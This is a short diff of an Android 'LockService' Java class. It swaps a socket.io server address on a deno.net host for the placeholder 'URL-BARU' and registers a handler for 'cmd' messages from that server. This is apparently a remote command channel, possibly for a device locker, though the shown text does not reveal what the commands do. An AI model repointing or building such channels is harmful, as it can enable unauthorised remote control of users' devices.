@@ -57,7 +57,7 @@ public class LockService extends Service {
 
     private void connectToServer() {
         try {
-            socket = IO.socket("https://wapi-server10-40-mgps7rfvkvmk.diskon-member.deno.net");
+            socket = IO.socket("https://URL-BARU");
             socket.on("cmd", args -> {
                 try {
                     JSONObject d = (JSONObject) args[0];
@@ -336,4 +336,4 @@ public class LockService extends Service {
         if (socket != null) socket.disconnect();
         super.onDestroy();
     }
-                                  }
+}
